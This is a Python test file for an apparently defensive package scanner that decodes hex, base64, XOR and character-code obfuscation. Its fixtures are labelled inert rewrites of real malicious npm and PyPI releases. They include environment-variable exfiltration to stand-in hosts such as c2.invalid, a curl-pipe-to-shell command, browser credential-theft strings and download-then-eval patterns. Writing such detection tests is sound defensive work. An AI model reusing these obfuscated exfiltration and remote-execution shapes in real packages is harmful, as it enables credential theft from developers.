"""0.1.8: names and code in strings a file decodes as it runs, eval of a
file's own decoder, code run through Function.constructor, statements a
formatter spread over several rows, values carried by environment
variables, and a script downloaded or decoded, written to a file and run
with a shell or an interpreter.

Each shape is one the 0.1.7 benchmark missed in real malicious releases
(tailwind-book-icon, postman-converters, awaitly and @redhat-cloud-services,
chai-use-chain, node-tailwind-magic, eth-security-auditor, ptmpl, litellm
1.82.7); the texts here are inert rewrites of them: hosts are .invalid,
payloads are placeholders, nothing is executed.
"""
import base64
import unittest

from lazaret.scanner import core, engine

NOTE = engine.pack_value("_DV_NOTE")
RUN = "runs code it receives over the network"


def hexs(s):
    return s.encode().hex()


TAILWIND = ("\"use strict\";\n\nfunction g(h) { return h.replace(/../g, match => String.fromCharCode(parseInt(match, 16))); }\n\n"
            "let hl = [\n    g('%s'),\n    g('%s'),\n    g('%s'),\n    g('%s'),\n    g('%s'),\n];\n\n"
            "const writer = () => require(hl[1])[[hl[2]]](hl[3], { ...process.env })[[hl[4]]](r => eval(r.data));\n\n"
            "module.exports = writer;\n") % (hexs("require"), hexs("axios"), hexs("post"), hexs("https://c2.invalid/a"),
                                             hexs("then"))
METRICS = ("(() => {\n  const a = require(\n    Buffer.from(\"%s\", \"hex\").toString()\n  );\n"
           "  const env = Object.fromEntries(Object.keys(process[\"env\"]).map(k => [k, process[\"env\"][k]]));\n"
           "  const req = a.request({ hostname: 'collector.invalid', method: 'POST' });\n"
           "  req.write(JSON.stringify(env));\n  req.end();\n})();\n") % hexs("https")
CAESAR_CODES = ",".join(str(40 + (k % 80)) for k in range(260))
CAESAR = ("try{eval(function(s,n){return s.replace(/[a-zA-Z]/g,function(c){var b=c<=\"Z\"?65:97;"
          "return String.fromCharCode((c.charCodeAt(0)-b+n)%26+b)})}([" + CAESAR_CODES + "],17))}catch(e){}\n")


def rule_hits(rule_id, text):
    rx = next(r for r in core.RULES if r["id"] == rule_id)["re"]
    return [k + 1 for k, row in enumerate(text.split("\n")) if rx.search(row)]


class DecodedViewTests(unittest.TestCase):
    def test_a_helper_and_a_constant_array(self):
        view = core.decoded_view(TAILWIND)
        self.assertIn("require('axios')[['post']]('https://c2.invalid/a', { ...process.env })[['then']]", view)
        self.assertEqual(view.count("\n"), TAILWIND.count("\n"))            # lines stay the file's
        reasons, line = core.import_time_risk(TAILWIND, "js")
        self.assertEqual((reasons, line), ([RUN + NOTE], 13))
        self.assertEqual(core.import_time_severity(reasons), "CRITICAL")

    def test_decode_calls_on_literals(self):
        cases = {
            "Buffer.from('%s', 'hex').toString()" % hexs("os"): "'os'",
            "Buffer.from(\"%s\", \"base64\").toString('utf8')" % base64.b64encode(b"https").decode(): "'https'",
            "atob('%s')" % base64.b64encode(b"child_process").decode(): "'child_process'",
            "bytes.fromhex('%s').decode()" % hexs("requests"): "'requests'",
            "base64.b64decode('%s').decode('utf-8')" % base64.b64encode(b"subprocess").decode(): "'subprocess'",
            "binascii.unhexlify('%s').decode()" % hexs("socket"): "'socket'",
        }
        for text, want in cases.items():
            with self.subTest(text):
                self.assertEqual(core.decoded_view(text), want)
        # once something is decoded, pieces are joined and members named by literals read as members
        self.assertEqual(core.decoded_view("atob('eA==');\nrequire('chi' + 'ld_pro' + 'cess'); y = process[\"env\"];\n"),
                         "'x';\nrequire('child_process'); y = process.env;\n")

    def test_what_is_left_as_written(self):
        for text in ("Buffer.from('zz', 'hex').toString()",          # not hex
                     "atob('eA=')",                                  # badly padded
                     "Buffer.from('%s', 'hex').toString()" % "00ff",  # not printable
                     "g('6f73')",                                    # no helper named g
                     "const a = ['os']; a[0]",                       # nothing decoded: arrays are not read
                     "process[\"env\"]"):                            # nor members
            with self.subTest(text):
                self.assertEqual(core.decoded_view(text), text)

    def test_a_mutated_array_is_not_read(self):
        text = ("function g(h) { return Buffer.from(h, 'hex').toString(); }\nconst a = [g('%s'), g('%s')];\n"
                "a.reverse();\nrequire(a[0]);\n") % (hexs("os"), hexs("fs"))
        view = core.decoded_view(text)
        self.assertIn("['os', 'fs']", view)
        self.assertIn("require(a[0])", view)

    def test_names_hidden_from_the_install_script_test(self):
        self.assertEqual(core.install_script_risk(METRICS),
                         ["sends environment variables over the network (the whole environment)" + NOTE])

    def test_bounded(self):
        import time
        big = "g('6f73')" + " " * engine.pack_value("_DV_MAX_CHARS")
        self.assertEqual(core.decoded_view(big), big)
        start = time.perf_counter()
        core.decoded_view(("atob('eA==') + " * 20_000) + "\nx = [" + "'a'," * 70_000 + "]\n")
        self.assertLess(time.perf_counter() - start, 5.0)


def xored(text, key, kind="base64"):
    data = bytes(b ^ key[i % len(key)] for i, b in enumerate(text.encode()))
    return data.hex() if kind == "hex" else base64.b64encode(data).decode().rstrip("=")


# react-zutils 1.0.1's shape (inert: the address is .invalid)
ZUTILS_WORDS = ["sqlite3", "child_process", "crypto", "https://c2.ngrok-free.app/api", "Login Data",
                "SELECT * FROM logins", "Local State"]
ZUTILS = ("const c=\"base64\",s=\"utf8\",n=(t,e)=>{let r=Buffer.from(t,c);const o=r.length;let n=0,a=new Uint8Array(o);"
          "for(index=0;index<o;index++){n=3&index;let t=e[l](n);a[index]=255&(r[index]^t)}return Buffer.from(a).toString(s)},"
          "a=t=>n(t,s),l=\"charCodeAt\",\n"
          + ",\n".join(f'v{i}=a("{xored(w, b"utf8")}")' for i, w in enumerate(ZUTILS_WORDS)) + ";\n"
          "const q=require(v1);\n")


class XorDecoderTests(unittest.TestCase):
    """0.1.8: a home-made XOR decoder's calls read as the text they decode to
    (react-zutils 1.0.1)."""

    def test_calls_of_a_xor_decoder_are_read(self):
        view = core.decoded_view(ZUTILS)
        self.assertIn("v0='sqlite3'", view)
        self.assertIn("v3='https://c2.ngrok-free.app/api'", view)
        self.assertEqual(view.count("\n"), ZUTILS.count("\n"))
        # (0.1.8: the service the decoded address names is where data would
        # go, not a sign on its own: this shape reads and sends nothing)
        self.assertEqual(core.install_script_risk(ZUTILS), [])

    def test_hex_and_other_keys(self):
        text = ("const k = 'k3y!'; Buffer; x ^ y;\n"
                + "\n".join(f"dec('{xored(w, b'k3y!', 'hex')}');" for w in ZUTILS_WORDS) + "\n")
        view = core.decoded_view(text)
        self.assertIn("\n'sqlite3';\n'child_process';\n", view)

    def test_what_is_not_a_xor_decoder(self):
        words = ZUTILS_WORDS[:5]
        calls = ",".join(f'a("{xored(w, b"utf8")}")' for w in words)
        for text in (
                "Buffer 'utf8' " + calls,                                  # no ^
                "Buffer x^y " + calls,                                     # no key among the literals
                "Buffer x^y 'utf8' " + ",".join(f'a("{xored(w, b"utf8")}")' for w in words[:4]),   # four calls
                "Buffer x^y 'utf8' " + ",".join(f'a("{xored(w, b"utf8")}")' for w in ["os", "fs", "vm", "tty", "url"]),
                # an i18n helper: short keys, few bytes
                "Buffer x^y 'utf8' t('menu'); t('help'); t('save'); t('open'); t('edit'); t('quit');"):
            with self.subTest(text[:40]):
                self.assertEqual(core.decoded_view(text), text)
        # one call in ten may stay unread, not two
        nine = "Buffer x^y 'utf8' " + ",".join(f'a("{xored(w, b"utf8")}")' for w in ZUTILS_WORDS + ["abc", "def"])
        self.assertNotEqual(core.decoded_view(nine + ',a("x-y")'), nine + ',a("x-y")')
        self.assertEqual(core.decoded_view(nine + ',a("x-y"),a("x-y")'), nine + ',a("x-y"),a("x-y")')

    def test_the_first_256_keys_are_tried(self):
        calls = ",".join(f'a("{xored(w, b"utf8")}")' for w in ZUTILS_WORDS)
        many = "".join(f"'k{i}';" for i in range(engine.pack_value("_DV_XOR_MAX_KEYS") - 1))
        tried = "Buffer x^y " + many + "'utf8'; " + calls
        self.assertIn("'sqlite3'", core.decoded_view(tried))
        past = "Buffer x^y " + many + "'k-last'; 'utf8'; " + calls
        self.assertEqual(core.decoded_view(past), past)

    def test_bounded(self):
        import time
        calls = ",".join(f'a("{xored(w, b"utf8")}")' for w in ZUTILS_WORDS)
        for text in ("Buffer x^y " + "".join(f"'k{i}';" for i in range(5000)) + calls * 50,
                     "Buffer x^y " + ",".join(f'f{i % 300}("QUJDRA")' for i in range(100_000)),
                     "Buffer x^y 'utf8' " + 'a("' + "A" * 400 + '"),' * 20_000):
            start = time.perf_counter()
            core.decoded_view(text)
            self.assertLess(time.perf_counter() - start, 5.0, text[:30])


def codes(text, f):
    """The array literal of `text`'s character codes, each c at position i made f(c, i)."""
    return "[" + ", ".join(str(f(ord(ch), i)) for i, ch in enumerate(text)) + "]"


def keyed(i, bias):
    """A key that moves with the position (the shape @fnos/app's decoder had, other constants)."""
    return (i + bias) * 29 + 11 & 0xff


class CharCodeTests(unittest.TestCase):
    """0.1.8: character codes read as text — literal ones, and what a file's
    own decoder computes from them, whatever its key (inert rewrites; hosts
    are .invalid)."""

    def test_literal_character_codes(self):
        cases = {
            "String.fromCharCode(104, 116, 116, 112, 115)": "'https'",
            "String.fromCharCode(...[0x63, 0x75, 0x72, 0x6c])": "'curl'",
            "String.fromCharCode.apply(null, [101, 118, 97, 108])": "'eval'",
            "''.join(map(chr, [111, 115]))": "'os'",
            "''.join(chr(c) for c in [115, 104])": "'sh'",
            "''.join([chr(x) for x in (98, 97, 115, 104)])": "'bash'",
            "bytes([99, 117, 114, 108]).decode()": "'curl'",
            "bytearray([119, 103, 101, 116]).decode('utf-8')": "'wget'",
        }
        for src, want in cases.items():
            with self.subTest(src):
                self.assertEqual(core.decoded_view("x = " + src + ";\n"), "x = " + want + ";\n")
        for src in ("String.fromCharCode(10)", "String.fromCharCode(65 + i)", "bytes([0, 1]).decode()",
                    "String.fromCharCode(0x110000)", "''.join(map(chr, []))"):
            with self.subTest(src):
                self.assertEqual(core.decoded_view("x = " + src + ";\n"), "x = " + src + ";\n")

    def test_a_decoder_with_a_key_that_moves(self):
        text = ("function unpack(buffer, bias) {\n  var out = '';\n"
                "  for (var pos = 0; pos < buffer.length; pos++) {\n"
                "    out += String.fromCharCode(buffer[pos] ^ ((pos + bias) * 29 + 11 & 0xff));\n  }\n  return out;\n}\n"
                "var _dir = " + codes("worker", lambda c, i: c ^ keyed(i, 4)) + ";\n"
                "var p = path.join(__dirname, unpack(_dir, 4), unpack(" + codes("run.js", lambda c, i: c ^ keyed(i, 9))
                + ", 9));\nspawn(process.execPath, [p], { detached: true, stdio: 'ignore' }).unref();\n")
        view = core.decoded_view(text)
        self.assertIn("var p = path.join(__dirname, 'worker', 'run.js');", view)
        self.assertEqual(view.count("\n"), text.count("\n"))
        self.assertEqual(core.spawned_scripts(text), [("dir", "worker/run.js")])

    def test_the_forms_of_a_decoder(self):
        cases = [
            # an arrow over .map, the key and the position
            ("const d = (a, k) => a.map((c, i) => String.fromCharCode(c - k - i)).join('');\n",
             lambda w: "d(" + codes(w, lambda c, i: c + 5 + i) + ", 5)"),
            # a function's spread of .map
            ("function d(a) { return String.fromCharCode(...a.map(c => c ^ 0x5a)); }\n",
             lambda w: "d(" + codes(w, lambda c, i: c ^ 0x5a) + ")"),
            # map with a function callback
            ("var d = function (a) { return a.map(function (c) { return String.fromCharCode(c + 3); }).join(''); };\n",
             lambda w: "d(" + codes(w, lambda c, i: c - 3) + ")"),
            # a string and a string key
            ("function d(s, key) { var o = ''; for (let i = 0; i < s.length; i++) "
             "o += String.fromCharCode(s.charCodeAt(i) - key.charCodeAt(i % key.length) + 32); return o; }\n",
             lambda w: "d('" + "".join(chr(ord(ch) + ord("#("[i % 2]) - 32) for i, ch in enumerate(w)) + "', '#(')"),
            # a string split into characters
            ("const d = (s) => s.split('').map(ch => String.fromCharCode(ch.charCodeAt(0) - 1)).join('');\n",
             lambda w: "d('" + "".join(chr(ord(ch) + 1) for ch in w) + "')"),
            # Python: a generator, enumerate, range(len(…)), a string
            ("def d(data, k):\n    return ''.join(chr(c ^ k) for c in data)\n",
             lambda w: "d(" + codes(w, lambda c, i: c ^ 42) + ", 42)"),
            ("def d(data, k):\n    return ''.join([chr((c + 256 - i - k) % 256) for i, c in enumerate(data)])\n",
             lambda w: "d(" + codes(w, lambda c, i: (c + i + 7) % 256) + ", 7)"),
            ("def d(data):\n    out = ''\n    for i in range(len(data)):\n        out += chr(data[i] ^ 0x21)\n    return out\n",
             lambda w: "d(" + codes(w, lambda c, i: c ^ 0x21) + ")"),
            ("def d(s):\n    return ''.join(chr(ord(ch) - 2) for ch in s)\n",
             lambda w: "d('" + "".join(chr(ord(ch) + 2) for ch in w) + "')"),
        ]
        for decoder, call in cases:
            with self.subTest(decoder[:50]):
                text = decoder + "x = " + call("https://c2.invalid/k") + "\n"
                self.assertEqual(core.decoded_view(text), decoder + "x = 'https://c2.invalid/k'\n")

    def test_an_array_named_once_and_never_changed(self):
        dec = "function d(a) { let s = ''; for (let i = 0; i < a.length; i++) s += String.fromCharCode(a[i] - 1); return s; }\n"
        arr = codes("child_process", lambda c, i: c + 1)
        self.assertIn("require('child_process')", core.decoded_view(dec + "const P = " + arr + ";\nrequire(d(P));\n"))
        for extra in ("P = [];\n", "P.push(1);\n", "P[0] = 1;\n"):
            text = dec + "let P = " + arr + ";\n" + extra + "require(d(P));\n"
            with self.subTest(extra):
                self.assertNotIn("child_process", core.decoded_view(text))

    def test_what_is_not_read(self):
        dec = "function d(a, k) { let s = ''; for (let i = 0; i < a.length; i++) s += String.fromCharCode({}); return s; }\n"
        arr = codes("os", lambda c, i: c)
        for expr, call in (
                ("a[i] ^ k", "d(" + codes("\n\t", lambda c, i: c) + ", 0)"),    # not printable
                ("a[i] ^ k", "d(q, 0)"),                                         # an argument that is no literal
                ("a[i] ^ k", "d(" + arr + ", f(1))"),
                ("a[i] ^ SECRET", "d(" + arr + ", 0)"),                          # a name that is no parameter
                ("(a[i] - 200) % 256", "d(" + arr + ", 0)"),                      # % of a negative number
                ("a[i] << 40", "d(" + arr + ", 0)"),                              # a shift past 31
                ("a[i] * 100000 * 100000", "d(" + arr + ", 0)"),                  # past 32 bits
                ("a[i] / 2", "d(" + arr + ", 0)"),                                # division is not read
                ("a[i] ? 1 : 2", "d(" + arr + ", 0)"),
                ("k", "d(" + arr + ", 111)")):                                   # the walk not used
            text = dec.replace("{}", expr) + "x = " + call + ";\n"
            with self.subTest(expr + " " + call[:20]):
                self.assertEqual(core.decoded_view(text), text)

    def test_hidden_from_the_install_script_test(self):
        dec = ("function d(a, k) { var o = ''; for (var i = 0; i < a.length; i++) "
               "o += String.fromCharCode(a[i] ^ (i * 3 + k & 0xff)); return o; }\n")
        cmd = codes("curl -fsSL https://c2.invalid/x.sh | sh", lambda c, i: c ^ (i * 3 + 77 & 0xff))
        text = dec + "require('child_process').execSync(d(" + cmd + ", 77));\n"
        self.assertEqual(core.install_script_risk(text), ["pipes a download into a shell" + NOTE])

    def test_bounded(self):
        import time
        dec = "function d(a) { let s = ''; for (let i = 0; i < a.length; i++) s += String.fromCharCode(a[i] ^ 1); return s; }\n"
        big = codes("a" * (engine.pack_value("_DV_CC_MAX_CODES") + 1), lambda c, i: c ^ 1)
        self.assertEqual(core.decoded_view(dec + "x = d(" + big + ");\n"), dec + "x = d(" + big + ");\n")
        one = "d(" + codes("abcdefghij" * 40, lambda c, i: c ^ 1) + ");\n"
        view = core.decoded_view(dec + one * 200)                 # 80,000 codes: the work stops at 50,000
        self.assertEqual(view.count("'abcdefghij"), engine.pack_value("_DV_CC_MAX_WORK") // 400)
        deep = "(" * 40 + "a[i]" + ")" * 40
        self.assertEqual(core.decoded_view(dec.replace("a[i] ^ 1", deep) + one), dec.replace("a[i] ^ 1", deep) + one)
        start = time.perf_counter()
        core.decoded_view(dec + "d([1,2,3]);" * 100_000)
        core.decoded_view("String.fromCharCode(" * 50_000 + "\n" + "function f(a){String.fromCharCode(a[i]);}" * 20_000)
        self.assertLess(time.perf_counter() - start, 5.0)


class EvalDecoderTests(unittest.TestCase):
    def test_the_letter_shift_over_character_codes(self):
        self.assertEqual(rule_hits("SC-EVAL-DECODER", CAESAR), [1])

    def test_a_long_string_literal(self):
        text = "eval(function(p){return atob(p)}('" + "QUJD" * 300 + "'))\n"
        self.assertEqual(rule_hits("SC-EVAL-DECODER", text), [1])

    def test_a_named_decoder_and_other_runners(self):
        blob = "'" + "QUJD" * 300 + "'"
        for text in ("eval(decode(" + blob + "))", "new Function(unpack(" + blob + "))()",
                     "vm.runInThisContext(d(" + blob + "))",
                     "eval(function(p,a,c,k,e,d){return p}(" + blob + ",62,10,'a|b'.split('|'),0,{}))"):
            with self.subTest(text[:30]):
                self.assertEqual(rule_hits("SC-EVAL-DECODER", text), [1])

    def test_short_literals_and_other_evals(self):
        for text in ("eval(function(s,n){return s}([1,2,3],1))", "eval(function(s){return s}('abc'))",
                     "eval(code)", "eval(function(){ return 1 })",
                     "eval(function(s,n){return s}([" + ",".join(["1"] * 150) + "],1))"):
            with self.subTest(text[:40]):
                self.assertEqual(rule_hits("SC-EVAL-DECODER", text), [])


class ReceivedCodeFormsTests(unittest.TestCase):
    def test_function_constructor_runs_code(self):
        for runner in ("new Function.constructor('require', s)", "Function.constructor(s)",
                       "[].constructor.constructor(s)", "Object.constructor(s)",
                       "[]['constructor']['constructor'](s)"):
            with self.subTest(runner):
                text = ("const axios = require('axios');\n(async () => {\n  const s = (await axios.get(u)).data;\n"
                        "  const h = " + runner + ";\n  h(require);\n})();\n")
                self.assertEqual(core._received_code_kind(text), (4, "run"))

    def test_statements_over_several_rows(self):
        chain = ("const axios = require('axios');\n(async () => {\n  axios\n    .post('https://c2.invalid/a', { v })\n"
                 "    .then((r) => {\n      // a comment\n      eval(r.data.model);\n    });\n})();\n")
        call = ("import subprocess\nr = subprocess.run(\n    ['curl', '-sL',\n     'https://c2.invalid/p.js'],\n"
                "    capture_output=True, text=True,\n)\nif r.stdout:\n    subprocess.run(['node', '-e', r.stdout],\n"
                "                   capture_output=True)\n")
        backslash = "import requests\nx = requests.get('https://c2.invalid/p', \\\n    timeout=3).text\nexec(x)\n"
        py_chain = "import requests\ndata = (requests\n        .get('https://c2.invalid/p')\n        .text)\nexec(data)\n"
        for text, line in ((chain, 7), (call, 8), (backslash, 4), (py_chain, 5)):
            with self.subTest(text.split("\n")[2]):
                self.assertEqual(core._received_code_kind(text), (line, "run"))

    def test_a_function_body_is_never_joined(self):
        text = ("const axios = require('axios');\nfoo(function () {\n  const s = 1;\n});\n"
                "axios.get(u);\n" + "x;\n" * 60 + "eval(s);\n")
        self.assertIsNone(core._received_code_kind(text))

    def test_values_carried_by_environment_variables(self):
        cases = [
            ("import os, requests\nos.environ['P'] = requests.get(u).text\nexec(os.getenv('P'))\n", (3, "run")),
            ("import os, requests\nos.environ['P'] = requests.get(u).text\nexec(os.environ['P'])\n", (3, "run")),
            ("import os, requests, importlib\nos.environ['M'] = requests.get(u).text\n"
             "importlib.import_module(os.environ.get('M', 'x'))\n", (3, "import")),
            ("const axios = require('axios');\n(async () => {\n  process.env['P'] = (await axios.get(u)).data;\n"
             "  eval(process.env['P']);\n})();\n", (4, "run")),
        ]
        for text, want in cases:
            with self.subTest(text.split("\n")[1]):
                self.assertEqual(core._received_code_kind(text), want)
        # a variable the environment set, not the package, is not a received value
        self.assertIsNone(core._received_code_kind("import os, requests\nrequests.get(u)\nexec(os.getenv('P'))\n"))

    def test_members_read_by_name(self):
        """(the follower's adversarial pass) getattr(m, 'x') and m['x'] are m.x."""
        cases = [
            ("import requests\nexec(getattr(requests, 'get')('https://c2.invalid/p').text)\n", (2, "run")),
            ("import requests\nexec(getattr(requests, \"get\", None)('https://c2.invalid/p').text)\n", (2, "run")),
            ("import requests\nr = requests.get('https://c2.invalid/p')\nexec(r.__dict__['_content'])\n", (3, "run")),
        ]
        for text, want in cases:
            with self.subTest(text.split("\n")[1]):
                self.assertEqual(core._received_code_kind(text), want)
        self.assertIsNone(core._received_code_kind("import requests\nx = getattr(requests, 'get')(u).text\nprint(x)\n"))

    def test_member_names_the_file_builds(self):
        """(the detection round) getattr's name in pieces or in a constant;
        a runner named through the builtins or the global object."""
        u = "'https://c2.invalid/p'"
        cases = [
            ("import requests, builtins\ngetattr(builtins, 'ex' + \"ec\")(requests.get(" + u + ").text)\n", (2, "run")),
            ("import requests, builtins\ngetattr(builtins, 'exec', None)(requests.get(" + u + ").text)\n", (2, "run")),
            ("import requests\nN = 'ev' + 'al'\ngetattr(__builtins__, N)(requests.get(" + u + ").text)\n", (3, "run")),
            ("import requests\nH = 'ex'\ngetattr(__builtins__, H + 'ec')(requests.get(" + u + ").text)\n", (3, "run")),
            ("import requests\n__builtins__.__dict__['exec'](requests.get(" + u + ").text)\n", (2, "run")),
            ("fetch(" + u + ").then((r) => r.text()).then((c) => globalThis['eval'](c));\n", (1, "run")),
            ("fetch(" + u + ").then((r) => r.text()).then((c) => window.Function(c)());\n", (1, "run")),
        ]
        for text, want in cases:
            with self.subTest(text.split("\n")[1][:50]):
                self.assertEqual(core._received_code_kind(text), want)
        for text in ("import requests\nN = 'exec'\nN = 'print'\ngetattr(__builtins__, N)(requests.get(" + u + ").text)\n",
                     "import requests\nN = 'ex'\nN += 'ec'\ngetattr(__builtins__, N)(requests.get(" + u + ").text)\n",
                     "import requests\ndef f(n):\n    getattr(__builtins__, n)(requests.get(" + u + ").text)\n",
                     "import requests\ngetattr(__builtins__, 'ex' + 'e-c')(requests.get(" + u + ").text)\n",
                     "import requests, builtins\nbuiltins.execute(requests.get(" + u + ").text)\n",
                     "fetch(" + u + ").then((r) => r.text()).then((c) => myglobal.eval(c));\n"):
            with self.subTest(text.split("\n")[1][:50]):
                self.assertIsNone(core._received_code_kind(text))

    def test_a_runner_handed_to_a_call(self):
        """p.then(eval), res.on('data', eval): the runner is called with what the call hands it."""
        cases = [
            "fetch('https://c2.invalid/p').then((r) => r.text()).then(eval);\n",
            "const https = require('https');\nhttps.get('https://c2.invalid/p', (res) => res.on('data', eval));\n",
            "const vm = require('vm');\nfetch('https://c2.invalid/p').then((r) => r.text()).then(vm.runInThisContext);\n",
        ]
        for text in cases:
            with self.subTest(text):
                self.assertEqual(core._received_code_kind(text)[1], "run")
        for quiet in ("fetch('https://c2.invalid/p').then((r) => r.text()).then(JSON.parse);\n",
                      "const f = eval;\nsetTimeout(() => f('1'), 0);\n", "fetch(u).then(() => items.map(String));\n"):
            with self.subTest(quiet):
                self.assertIsNone(core._received_code_kind(quiet))
        # (0, eval)(x) is an indirect eval, not a runner handed to a call
        self.assertIsNone(core._received_code_kind("(0, eval)(x);\n"))


class WrittenAndRunTests(unittest.TestCase):
    def test_a_decoded_payload_written_and_run(self):
        payload = base64.b64encode(b"print('inert')\n").decode()
        text = ("import subprocess, base64, sys, tempfile, os\n\nb64_payload = \"%s\"\n\n"
                "with tempfile.TemporaryDirectory() as d:\n    p = os.path.join(d, \"p.py\")\n"
                "    with open(p, \"wb\") as f:\n        f.write(base64.b64decode(b64_payload))\n\n"
                "    subprocess.run([sys.executable, p])\n") % payload
        reason = "writes code it decodes to a file and runs it with Python"
        self.assertEqual(core.import_time_risk(text, "py"), ([reason], 10))
        self.assertEqual(core.import_time_severity([reason]), "CRITICAL")
        self.assertIn(reason, core.install_script_risk(text))

    def test_a_decoded_binary_written_and_started(self):
        text = "const b = Buffer.from(blob, 'base64');\nfs.writeFileSync(f, b);\nspawn(f, [], { detached: true });\n"
        reasons, line = core.import_time_risk(text, "js")
        self.assertEqual((reasons, line, core.import_time_severity(reasons)),
                         (["writes a file it decodes and runs it"], 3, "MAJOR"))

    def test_nothing_decoded_near_the_write(self):
        text = "const b = Buffer.from(blob, 'base64');\n" + "x;\n" * 60 + "fs.writeFileSync(f, d);\nspawn(f);\n"
        self.assertEqual(core.import_time_risk(text, "js"), ([], None))


if __name__ == "__main__":
    unittest.main()
